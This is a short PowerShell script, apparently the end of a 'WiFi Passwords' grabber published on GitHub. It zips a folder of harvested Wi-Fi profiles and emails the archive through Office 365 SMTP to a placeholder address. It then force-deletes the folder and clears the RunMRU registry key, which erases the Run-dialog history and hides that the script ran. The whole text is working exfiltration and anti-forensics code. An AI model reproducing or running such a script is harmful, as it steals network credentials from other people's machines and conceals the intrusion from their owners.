Compress-Archive -Path wifi -DestinationPath wifi.zip
$SMTPServer = 'smtp.office365.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER EMAIL HERE', 'SENDER EMAIL PASSWORD HERE')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'SENDER EMAIL HERE'
$ReportEmail.To.Add('SEND TO EMAIL HERE')
$ReportEmail.Subject = "WiFi Passwords Script by GiKR-byte"
$ReportEmail.Body = "Here You Go... script by GiKR-byte on GitHub https://github.com/GiKR-byte"
$ReportEmail.Attachments.Add("wifi.zip")
$SMTPInfo.Send($ReportEmail)
Remove-Item wifi -Recurse -Force -Confirm:$false
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
exit